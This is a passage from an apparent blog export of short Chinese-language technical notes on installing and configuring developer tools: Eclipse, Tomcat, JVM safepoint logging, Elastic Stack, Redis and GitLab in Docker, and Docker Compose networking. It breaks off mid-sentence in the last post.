    <content><![CDATA[<h3 id="How-To-Change-Git-Directory-For-SourceTree"><a href="#How-To-Change-Git-Directory-For-SourceTree" class="headerlink" title="How To Change Git Directory For SourceTree"></a>How To Change Git Directory For SourceTree</h3><span id="more"></span>
<p>這篇介紹How To Change Git Directory For SourceTree。</p>
<h3 id="步驟"><a href="#步驟" class="headerlink" title="步驟"></a>步驟</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">將該目錄下.git資料夾從舊的目錄複製到新的目錄</span><br><span class="line">使用SourceTree -&gt; Add -&gt; 新的目錄即可進行commit、pull、push</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SourceTree</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>SourceTree</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Fix Start Tomcat Server Timeout On Eclipse</title>
    <url>/posts/77a3d715/</url>
    <content><![CDATA[<h3 id="Intro-How-To-Fix-Start-Tomcat-Server-Timeout-On-Eclipse"><a href="#Intro-How-To-Fix-Start-Tomcat-Server-Timeout-On-Eclipse" class="headerlink" title="Intro How To Fix Start Tomcat Server Timeout On Eclipse"></a>Intro How To Fix Start Tomcat Server Timeout On Eclipse</h3><span id="more"></span>
<p>這篇介紹How To Fix Start Tomcat Server Timeout On Eclipse.</p>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在Eclispe上啟動localhost時，跑到一半出現以下ERROR:</span><br><span class="line">Server Tomcat v8.5 Server at localhost was unable to start within 45 seconds.</span><br><span class="line">If the server requires more time, try increasing the <span class="built_in">timeout</span> <span class="keyword">in</span> the server editor.</span><br><span class="line">代表啟動超過45秒就<span class="built_in">timeout</span>停止。</span><br><span class="line"></span><br><span class="line">這個Timeout 45秒是可以調整的，在Servers針對Tomcat v8.5 Server at localhost</span><br><span class="line">左鍵點兩下，右上角有個Timeouts選項可以調整<span class="built_in">timeout</span>秒數。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eclipse</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
        <tag>Eclipse</tag>
        <tag>Timeout</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Find Safe Point Timeout Thread</title>
    <url>/posts/3ce4cc0f/</url>
    <content><![CDATA[<h3 id="How-To-Find-Safe-Point-Timeout-Thread"><a href="#How-To-Find-Safe-Point-Timeout-Thread" class="headerlink" title="How To Find Safe Point Timeout Thread"></a>How To Find Safe Point Timeout Thread</h3><span id="more"></span>
<p>這篇介紹How To Find Safe Point Timeout Thread。</p>
<h3 id="JVM參數"><a href="#JVM參數" class="headerlink" title="JVM參數"></a>JVM參數</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-XX:+SafepointTimeout</span><br><span class="line"></span><br><span class="line">-XX:SafepointTimeoutDelay=2000</span><br><span class="line"></span><br><span class="line">以上兩個參數表示當有Thread進入Safe Point超過2000ms時，會認為發生Timeout。</span><br><span class="line">在catalina.out會印出哪個Thread沒有進入Safe Point。</span><br><span class="line"></span><br><span class="line">Print example:</span><br><span class="line"><span class="comment"># SafepointSynchronize::begin: Timeout detected:</span></span><br><span class="line"><span class="comment"># SafepointSynchronize::begin: Timed out while spinning to reach a safepoint.</span></span><br><span class="line"><span class="comment"># SafepointSynchronize::begin: Threads which did not reach the safepoint:</span></span><br><span class="line"><span class="comment"># &quot;redisson-netty-2-51&quot; #75 prio=5 os_prio=0 tid=0x00007fa264001000 nid=0x11e686 runnable [0x00007fa2b0a1b000]</span></span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br><span class="line"></span><br><span class="line"><span class="comment"># SafepointSynchronize::begin: (End of list)</span></span><br><span class="line"></span><br><span class="line">由上述<span class="built_in">log</span>可看出Thread redisson-netty-2-51進入Safe Point Timeout。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Install Dig Instruction On Windows</title>
    <url>/posts/7f62909e/</url>
    <content><![CDATA[<h3 id="How-To-Install-Dig-Instruction-On-Windows"><a href="#How-To-Install-Dig-Instruction-On-Windows" class="headerlink" title="How To Install Dig Instruction On Windows"></a>How To Install Dig Instruction On Windows</h3><span id="more"></span>
<p>這篇介紹How To Install Dig Instruction On Windows。</p>
<h3 id="安裝步驟"><a href="#安裝步驟" class="headerlink" title="安裝步驟"></a>安裝步驟</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">先至https://www.isc.org/download/ 下載Windows版本的壓縮檔。</span><br><span class="line">將解壓縮後的所有應用程式擴充檔案(.dll) 及 dig.exe</span><br><span class="line">copy 至 C:\Windows\System32 下</span><br><span class="line"></span><br><span class="line">開啟cmd.exe </span><br><span class="line">$ dig -v</span><br><span class="line">如果有出現版本號，代表有成功，即可開始使用。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Dig</category>
      </categories>
      <tags>
        <tag>Dig</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Deploy Tomcat 10 And JDK 17</title>
    <url>/posts/7b4825ce/</url>
    <content><![CDATA[<h3 id="How-To-Deploy-Tomcat-10-And-JDK-17"><a href="#How-To-Deploy-Tomcat-10-And-JDK-17" class="headerlink" title="How To Deploy Tomcat 10 And JDK 17"></a>How To Deploy Tomcat 10 And JDK 17</h3><span id="more"></span>
<p>這篇介紹How To Deploy Tomcat 10 And JDK 17.</p>
<h3 id="事前安裝-amp-設定"><a href="#事前安裝-amp-設定" class="headerlink" title="事前安裝&amp;設定"></a>事前安裝&amp;設定</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.下載Tomcat10 portable 最新版。</span><br><span class="line">2.下載zulu JDK 17最新版。</span><br><span class="line">3.環境變數Path 和 JAVA_HOME皆設定JDK17 bin/目錄</span><br><span class="line">4.Window -&gt; Preferences -&gt; Java -&gt; Installed JREs -&gt; Add -&gt; zulu-17(default)</span><br></pre></td></tr></table></figure>

<h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.請更新Eclipse為最新版本</span><br><span class="line"></span><br><span class="line">2.pom.xml需更改相關參數設定</span><br><span class="line"></span><br><span class="line">&lt;properties&gt;</span><br><span class="line">	&lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">	&lt;jdk.version&gt;17&lt;/jdk.version&gt;</span><br><span class="line">	&lt;log4j2.version&gt;2.17.1&lt;/log4j2.version&gt;</span><br><span class="line">	&lt;tomcat.version&gt;10.0.14&lt;/tomcat.version&gt;</span><br><span class="line">&lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">&lt;plugin&gt;</span><br><span class="line">	&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;3.8.1&lt;/version&gt;</span><br><span class="line">	&lt;configuration&gt;</span><br><span class="line">		&lt;encoding&gt;utf-8&lt;/encoding&gt;</span><br><span class="line">		&lt;<span class="built_in">source</span>&gt;<span class="variable">$&#123;jdk.version&#125;</span>&lt;/source&gt;</span><br><span class="line">		&lt;target&gt;<span class="variable">$&#123;jdk.version&#125;</span>&lt;/target&gt;</span><br><span class="line">	&lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>JDK</tag>
        <tag>Tomcat</tag>
        <tag>Eclipse</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Install Elastic Stack</title>
    <url>/posts/f762a89f/</url>
    <content><![CDATA[<h3 id="Intro-How-To-Install-Elastic-Stack"><a href="#Intro-How-To-Install-Elastic-Stack" class="headerlink" title="Intro How To Install Elastic Stack"></a>Intro How To Install Elastic Stack</h3><span id="more"></span>
<p>這篇介紹How To Install Elastic Stack.</p>
<h3 id="Add-User-ELK"><a href="#Add-User-ELK" class="headerlink" title="Add User ELK"></a>Add User ELK</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo adduser -U -p somepasswords elk</span><br></pre></td></tr></table></figure>

<h3 id="Install-Zulu-JDK"><a href="#Install-Zulu-JDK" class="headerlink" title="Install Zulu JDK"></a>Install Zulu JDK</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/local</span><br><span class="line">$ wget https://cdn.azul.com/zulu/bin/zulu8.62.0.19-ca-jdk8.0.332-linux_x64.tar.gz</span><br><span class="line">$ tar zxvf zulu8.62.0.19-ca-jdk8.0.332-linux_x64.tar.gz</span><br><span class="line">$ <span class="built_in">ln</span> -sfn zulu8.62.0.19-ca-jdk8.0.332-linux_x64 java</span><br></pre></td></tr></table></figure>

<h3 id="Install-ElasticSearch-7-3-2"><a href="#Install-ElasticSearch-7-3-2" class="headerlink" title="Install ElasticSearch 7.3.2"></a>Install ElasticSearch 7.3.2</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> /home/elk/binary-7.3.2</span><br><span class="line">$ <span class="built_in">mkdir</span> /var/data/elasticsearch-7.3.2</span><br><span class="line">$ <span class="built_in">cd</span> /home/elk/binary-7.3.2</span><br><span class="line">$ wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.3.2-linux-x86_64.tar.gz</span><br><span class="line">$ tar zxvf elasticsearch-7.3.2-linux-x86_64.tar.gz</span><br><span class="line"></span><br><span class="line">/* add <span class="built_in">env</span> variable */</span><br><span class="line">$ vi /etc/sysctl.conf</span><br><span class="line">[ vm.max_map_count=655360 ]</span><br><span class="line">$ sysctl -p</span><br><span class="line"></span><br><span class="line">/* check nofile more than 65535 */</span><br><span class="line">$ vi /etc/security/limits.conf</span><br><span class="line">[</span><br><span class="line">  elk soft nofile 65536</span><br><span class="line">  elk hard nofile 65536</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">/* change folder previlige */</span><br><span class="line">$ <span class="built_in">chown</span> -R elk:elk /home/elk/binary-7.3.2</span><br><span class="line">$ <span class="built_in">chown</span> -R elk:elk /var/data/elasticsearch-7.3.2</span><br></pre></td></tr></table></figure>

<h3 id="Modify-config-x2F-elasticsearch-yml"><a href="#Modify-config-x2F-elasticsearch-yml" class="headerlink" title="Modify config&#x2F;elasticsearch.yml"></a>Modify config&#x2F;elasticsearch.yml</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cluster name</span></span><br><span class="line">cluster.name: nv-es</span><br><span class="line"></span><br><span class="line"><span class="comment">#node name </span></span><br><span class="line">node.name: node1</span><br><span class="line"></span><br><span class="line"><span class="comment">#data store path</span></span><br><span class="line">path.data: /var/data/elasticsearch-7.3.2 </span><br><span class="line"></span><br><span class="line"><span class="comment">#inbound bind address</span></span><br><span class="line">network.host: 0.0.0.0 </span><br><span class="line"></span><br><span class="line"><span class="comment">#outbound bin address</span></span><br><span class="line">network.publish_host: 192.168.x.x</span><br><span class="line"></span><br><span class="line"><span class="comment">#api port</span></span><br><span class="line">http.port: 9200 </span><br><span class="line"></span><br><span class="line"><span class="comment">#node communication port</span></span><br><span class="line">transport.tcp.port: 9300</span><br><span class="line"></span><br><span class="line"><span class="comment">#node discover host list</span></span><br><span class="line">discovery.seed_hosts: [<span class="string">&quot;someIP:9300&quot;</span>] </span><br><span class="line"></span><br><span class="line"><span class="comment">#initial master node</span></span><br><span class="line">cluster.initial_master_nodes: [<span class="string">&quot;someIP&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#enalbe security</span></span><br><span class="line">xpack.security.enabled: <span class="literal">true</span></span><br><span class="line">xpack.security.transport.ssl.enabled: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#enable monitor</span></span><br><span class="line">xpack.monitoring.collection.enabled: <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="Modify-config-x2F-jvm-options"><a href="#Modify-config-x2F-jvm-options" class="headerlink" title="Modify config&#x2F;jvm.options"></a>Modify config&#x2F;jvm.options</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Xms represents the initial size of total heap space</span></span><br><span class="line"><span class="comment"># Xmx represents the maximum size of total heap space</span></span><br><span class="line">-Xms1g</span><br><span class="line">-Xmx1g</span><br></pre></td></tr></table></figure>

<h3 id="Startup-ElasticSearch-in-daemon-mode"><a href="#Startup-ElasticSearch-in-daemon-mode" class="headerlink" title="Startup ElasticSearch in daemon mode"></a>Startup ElasticSearch in daemon mode</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/elk/binary-7.3.2/elasticsearch-7.3.2</span><br><span class="line">$ ./bin/elasticsearch -d</span><br></pre></td></tr></table></figure>

<h3 id="Setup-buildin-user-password"><a href="#Setup-buildin-user-password" class="headerlink" title="Setup buildin user password"></a>Setup buildin user password</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./bin/elasticsearch-setup-passwords interactive</span><br></pre></td></tr></table></figure>

<h3 id="Kibana-installation"><a href="#Kibana-installation" class="headerlink" title="Kibana installation"></a>Kibana installation</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Download kibana</span><br><span class="line">$ <span class="built_in">cd</span> /home/elk/binary-7.3.2</span><br><span class="line">$ wget https://artifacts.elastic.co/downloads/kibana/kibana-7.3.2-linux-x86_64.tar.gz</span><br><span class="line">$ tar zxvf kibana-7.3.2-linux-x86_64.tar.gz</span><br><span class="line"></span><br><span class="line">Modify config/kibana.yml</span><br><span class="line"><span class="comment"># lister port</span></span><br><span class="line">server.port: 5601</span><br><span class="line"></span><br><span class="line"><span class="comment"># inbound bind port</span></span><br><span class="line">server.host: <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setup elasticsearch connection info</span></span><br><span class="line">elasticsearch.hosts: [<span class="string">&quot;http://127.0.0.1:9200&quot;</span>]</span><br><span class="line">elasticsearch.username: <span class="string">&quot;kibana&quot;</span></span><br><span class="line">elasticsearch.password: <span class="string">&quot;somepasswords&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># log path</span></span><br><span class="line">logging.dest: logs/kibana.log</span><br><span class="line"></span><br><span class="line">Startup kibana <span class="keyword">in</span> daemon mode</span><br><span class="line">$ ./bin/kibana &amp;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Import Gitlab Project To Eclipse</title>
    <url>/posts/ef50d9d3/</url>
    <content><![CDATA[<h3 id="How-To-Import-Gitlab-Project-To-Eclipse"><a href="#How-To-Import-Gitlab-Project-To-Eclipse" class="headerlink" title="How To Import Gitlab Project To Eclipse"></a>How To Import Gitlab Project To Eclipse</h3><span id="more"></span>
<p>這篇介紹How To Import Gitlab Project To Eclipse。</p>
<h3 id="Step-by-step"><a href="#Step-by-step" class="headerlink" title="Step by step"></a>Step by step</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">In the Project Explorer section, right click and choose <span class="string">&quot;Import Project&quot;</span></span><br><span class="line"></span><br><span class="line">Under General, pick Existing Projects into Workspace.</span><br><span class="line"></span><br><span class="line">Click Next and browse the root directory of your project and click Finish.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Gitlab</category>
      </categories>
      <tags>
        <tag>Eclipse</tag>
        <tag>Gitlab</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Install Redis Docker</title>
    <url>/posts/214eb13b/</url>
    <content><![CDATA[<h3 id="Intro-How-To-Install-Redis-Docker"><a href="#Intro-How-To-Install-Redis-Docker" class="headerlink" title="Intro How To Install Redis Docker"></a>Intro How To Install Redis Docker</h3><span id="more"></span>
<p>這篇介紹How To Install Redis Docker.</p>
<h3 id="安裝準備工作"><a href="#安裝準備工作" class="headerlink" title="安裝準備工作"></a>安裝準備工作</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">install redis-cil on CentOS</span><br><span class="line"></span><br><span class="line">$ yum install epel-release</span><br><span class="line">$ yum install -y redis</span><br><span class="line"></span><br><span class="line">Linux 上安裝 docker</span><br><span class="line"></span><br><span class="line">$ yum install docker</span><br><span class="line">$ docker -v</span><br><span class="line">$ systemctl start docker</span><br><span class="line">$ systemctl <span class="built_in">enable</span> docker</span><br><span class="line"></span><br><span class="line">使用 docker 抓 Redis image</span><br><span class="line"></span><br><span class="line">$ docker pull redis:6.0.6 </span><br><span class="line">– specific version</span><br><span class="line">$ docker images </span><br><span class="line">-- 查看 pull 下來的 images</span><br><span class="line"></span><br><span class="line">建立 redis-conf 檔案在 /opt/redis_r1.conf</span><br><span class="line">內容</span><br><span class="line">port 7001</span><br><span class="line">appendonly <span class="built_in">yes</span></span><br><span class="line">protected-mode no</span><br><span class="line">pidfile redis.pid</span><br><span class="line">requirepass xxxx</span><br><span class="line">masterauth xxxx</span><br><span class="line"><span class="built_in">timeout</span> 600</span><br><span class="line"></span><br><span class="line"><span class="comment">#Memory</span></span><br><span class="line">maxmemory 1GB</span><br><span class="line">maxmemory-policy allkeys-lru</span><br><span class="line"></span><br><span class="line"><span class="comment"># AOF</span></span><br><span class="line">appendfsync everysec</span><br><span class="line">auto-aof-rewrite-percentage 100</span><br><span class="line">auto-aof-rewrite-min-size 3gb</span><br><span class="line"></span><br><span class="line"><span class="comment"># SNAPSHOTTING  save &lt;seconds&gt; &lt;changes&gt;</span></span><br><span class="line">save 900 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Log config</span></span><br><span class="line">loglevel notice</span><br><span class="line">logfile redis.log</span><br><span class="line"></span><br><span class="line"><span class="comment">#Slow log</span></span><br><span class="line">slowlog-log-slower-than 1000</span><br><span class="line">slowlog-max-len 300</span><br></pre></td></tr></table></figure>

<h3 id="執行指令"><a href="#執行指令" class="headerlink" title="執行指令"></a>執行指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">執行 Redis image </span><br><span class="line"></span><br><span class="line">掛載在 host 的 Redis config 檔</span><br><span class="line"></span><br><span class="line">並把 Redis persistence file 掛到 host 路徑下</span><br><span class="line"></span><br><span class="line">用類似 VM bridge 模式，將 Redis 2個nodes 跑在 host 的 port 7001</span><br><span class="line">(port 記得要改 conf file)</span><br><span class="line"></span><br><span class="line">$ docker run -v /opt/redis_r1.conf:/usr/local/etc/redis/redis.conf -v /data/r1:/data --name r1 --network host -d redis:6.0.6 redis-server /usr/local/etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line">先用 redis-cli 連接上任何一台 cluster 中的 node</span><br><span class="line">$ redis-cli -h 127.0.0.1 -p 7001</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="重啟服務"><a href="#重啟服務" class="headerlink" title="重啟服務"></a>重啟服務</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker 服務啟動後</span><br><span class="line"></span><br><span class="line">執行 docker ps -a 確認 container 狀態</span><br><span class="line"></span><br><span class="line">然後執行 docker start containerID 重啟服務</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Install Gitlab Docker</title>
    <url>/posts/cd9b51d9/</url>
    <content><![CDATA[<h3 id="How-To-Install-Gitlab-Docker"><a href="#How-To-Install-Gitlab-Docker" class="headerlink" title="How To Install Gitlab Docker"></a>How To Install Gitlab Docker</h3><span id="more"></span>
<p>這篇介紹How To Install Gitlab Docker.</p>
<h3 id="How-To-Install-Gitlab-Docker-1"><a href="#How-To-Install-Gitlab-Docker-1" class="headerlink" title="How To Install Gitlab Docker."></a>How To Install Gitlab Docker.</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Build gitlab with docker:</span><br><span class="line">Use official gitlab image to build gitlab and version is 13.3.6.</span><br><span class="line"></span><br><span class="line">$ docker run --detach --hostname &#123;&#123;ip&#125;&#125; -p &#123;&#123;port&#125;&#125;:80 --name gitlab --restart always --volume /home/gitlab/config:/etc/gitlab --volume /home/gitlab/logs:/var/log/gitlab --volume /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:13.3.6-ce.0</span><br><span class="line">&#123;ip&#125;:host ip address</span><br><span class="line">&#123;port&#125;:open up externally port number</span><br></pre></td></tr></table></figure>

<h3 id="Hardware-requirements"><a href="#Hardware-requirements" class="headerlink" title="Hardware requirements"></a>Hardware requirements</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Gitlab</span><br><span class="line">- Storage</span><br><span class="line">  The necessary hard drive space largely depends on the size of the repositories you want to store <span class="keyword">in</span> GitLab</span><br><span class="line">- CPU</span><br><span class="line">  4 cores is the recommended minimum number</span><br><span class="line">- Memory</span><br><span class="line">  4GB RAM is the required minimum memory size</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Gitlab</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Gitlab</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Let Docker Container Sync Time From Host</title>
    <url>/posts/b625969b/</url>
    <content><![CDATA[<h3 id="How-To-Let-Docker-Container-Sync-Time-From-Host"><a href="#How-To-Let-Docker-Container-Sync-Time-From-Host" class="headerlink" title="How To Let Docker Container Sync Time From Host"></a>How To Let Docker Container Sync Time From Host</h3><span id="more"></span>
<p>這篇介紹How To Let Docker Container Sync Time From Host。</p>
<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">如何讓container 比照 host 對時?</span><br><span class="line"></span><br><span class="line">在docker compose yml設定 加上 - /etc/localtime:/etc/localtime 即可</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>DockerCompose</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>DockerCompose</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Merge Two Lists By Java8</title>
    <url>/posts/5df35ed/</url>
    <content><![CDATA[<h3 id="Intro-How-To-Merge-Two-Lists-By-Java8"><a href="#Intro-How-To-Merge-Two-Lists-By-Java8" class="headerlink" title="Intro How To Merge Two Lists By Java8"></a>Intro How To Merge Two Lists By Java8</h3><span id="more"></span>
<p>這篇介紹How To Merge Two Lists By Java8。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; company1 = Arrays.asList(<span class="string">&quot;Apple&quot;</span>,<span class="string">&quot;Google&quot;</span>);</span><br><span class="line"> </span><br><span class="line">List&lt;String&gt; company2 = Arrays.asList(<span class="string">&quot;Meta&quot;</span>,<span class="string">&quot;Amazon&quot;</span>,<span class="string">&quot;NetFlix&quot;</span>);</span><br><span class="line"></span><br><span class="line">List&lt;String&gt; mergedList = Stream</span><br><span class="line">		.concat(company1.stream(), company2.stream())</span><br><span class="line">		.collect(Collectors.toList());</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java8</category>
      </categories>
      <tags>
        <tag>Java8</tag>
        <tag>Stream</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Restart And Enable Chronyd</title>
    <url>/posts/7704994e/</url>
    <content><![CDATA[<h3 id="How-To-Restart-And-Enable-Chronyd"><a href="#How-To-Restart-And-Enable-Chronyd" class="headerlink" title="How To Restart And Enable Chronyd"></a>How To Restart And Enable Chronyd</h3><span id="more"></span>
<p>這篇介紹How To Restart And Enable Chronyd。</p>
<h3 id="Step-by-step"><a href="#Step-by-step" class="headerlink" title="Step by step"></a>Step by step</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">重新啟動 chronyd</span><br><span class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># systemctl restart chronyd.service</span></span><br><span class="line"></span><br><span class="line">chronyd 預設開機啟動</span><br><span class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># systemctl enable chronyd.service</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Chronyd</category>
      </categories>
      <tags>
        <tag>Rocky8</tag>
        <tag>Chronyd</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Release Redisson RLock</title>
    <url>/posts/d3412b36/</url>
    <content><![CDATA[<h2 id="Intro-How-To-Release-Redisson-RLock"><a href="#Intro-How-To-Release-Redisson-RLock" class="headerlink" title="Intro How To Release Redisson RLock"></a>Intro How To Release Redisson RLock</h2><span id="more"></span>
<p>這篇介紹How To Release Redisson RLock.</p>
<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro:"></a>Intro:</h2><p>RLock lock &#x3D; null;<br>try {<br>    lock &#x3D; LockDAO.getLock(event);<br>    if (!lock.isLocked()) {<br>        lock.lock(SystemConstant.REDIS_LOCK_EXPIRE_IN_MINUTES, TimeUnit.MINUTES);<br>        System.out.println(i);<br>        Thread.sleep(((long)(Math.random() * 1000)));<br>    }<br>} catch (Exception e) {<br>    System.out.println(e.toString());<br>} finally {<br>    Optional.ofNullable(lock).filter(x -&gt; x.isHeldByCurrentThread()).filter(x -&gt; x.isLocked())<br>        .ifPresent(x -&gt; x.unlock());<br>}</p>
<h2 id="經測試使用"><a href="#經測試使用" class="headerlink" title="經測試使用"></a>經測試使用</h2><p>1.Optional.ofNullable(lock).filter(x -&gt; x.isHeldByCurrentThread()).filter(x -&gt; x.isLocked())<br>        .ifPresent(x -&gt; x.unlock());<br>2.設定lock(long leaseTime, TimeUnit unit)，leaseTime到期自動釋放<br>兩種方法皆會Release Redisson RLock。</p>
]]></content>
      <categories>
        <category>Redisson</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
        <tag>RLock</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Set Text File Encoding And New Text File Line Delimiter Cause Upgrade Eclipse</title>
    <url>/posts/44591a75/</url>
    <content><![CDATA[<h3 id="How-To-Set-Text-File-Encoding-And-New-Text-File-Line-Delimiter-Cause-Upgrade-Eclipse"><a href="#How-To-Set-Text-File-Encoding-And-New-Text-File-Line-Delimiter-Cause-Upgrade-Eclipse" class="headerlink" title="How To Set Text File Encoding And New Text File Line Delimiter Cause Upgrade Eclipse"></a>How To Set Text File Encoding And New Text File Line Delimiter Cause Upgrade Eclipse</h3><span id="more"></span>
<p>這篇介紹How To Set Text File Encoding And New Text File Line Delimiter Cause Upgrade Eclipse。</p>
<h3 id="Step-by-step"><a href="#Step-by-step" class="headerlink" title="Step by step"></a>Step by step</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Window -&gt; Prefereces -&gt; key <span class="keyword">in</span> (Workspace)</span><br><span class="line"></span><br><span class="line">1.Text file encoding -&gt; Other -&gt; choose UTF-8</span><br><span class="line">2.New text file line delimiter -&gt; Other -&gt; Unix</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eclipse</category>
      </categories>
      <tags>
        <tag>Eclipse</tag>
        <tag>Setting</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Set Docker Bridge Mode</title>
    <url>/posts/f5360b04/</url>
    <content><![CDATA[<h3 id="How-To-Set-Docker-Bridge-Mode"><a href="#How-To-Set-Docker-Bridge-Mode" class="headerlink" title="How To Set Docker Bridge Mode"></a>How To Set Docker Bridge Mode</h3><span id="more"></span>
<p>這篇介紹How To Set Docker Bridge Mode。</p>
<h3 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Bridge mode</span><br><span class="line">這是 Docker Compose 預設的網路模式，所有 service 預設 network_mode: 都是 bridge。</span><br><span class="line">當我們 docker-compose up 時，會建立一個名為 &lt;dir_name&gt;_default 的 network 出來，</span><br><span class="line">所有 bridge mode 的 container 會自己配網路卡並接上那個預設的 network。</span><br></pre></td></tr></table></figure>

<h3 id="yaml-Example"><a href="#yaml-Example" class="headerlink" title="yaml Example"></a>yaml Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&quot;3.9&quot;</span></span><br><span class="line">services:</span><br><span class="line">  tomcatmock:</span><br><span class="line">    extends:</span><br><span class="line">      file: services/tomcatmock.yml</span><br><span class="line">      service: tomcatmock</span><br><span class="line">    restart: <span class="string">&quot;no&quot;</span></span><br><span class="line">    networks:</span><br><span class="line">      baccaratserver:</span><br><span class="line">          ipv4_address: 192.168.0.1</span><br><span class="line">  redis:</span><br><span class="line">    image: redis:7.0.11</span><br><span class="line">    container_name: redis</span><br><span class="line">    <span class="built_in">command</span>: redis-server /usr/local/etc/redis/redis.conf</span><br><span class="line">    restart: <span class="string">&quot;no&quot;</span></span><br><span class="line">    networks:</span><br><span class="line">      baccaratserver:</span><br><span class="line">        ipv4_address: 192.168.0.201</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;7001:7001&quot;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - <span class="string">&quot;/opt/redis_r1.conf:/usr/local/etc/redis/redis.conf&quot;</span></span><br><span class="line">      - <span class="string">&quot;/data/r1:/data&quot;</span></span><br><span class="line">      - /etc/localtime:/etc/localtime</span><br><span class="line">networks:</span><br><span class="line">  baccaratserver:</span><br><span class="line">    name: baccaratserver_network</span><br><span class="line">    driver: bridge</span><br><span class="line">    ipam:</span><br><span class="line">        driver: default</span><br><span class="line">        config:</span><br><span class="line">            - subnet: 192.168.0.0/16</span><br><span class="line">              gateway: 192.168.0.254</span><br><span class="line">			  </span><br><span class="line">Container 與 Container 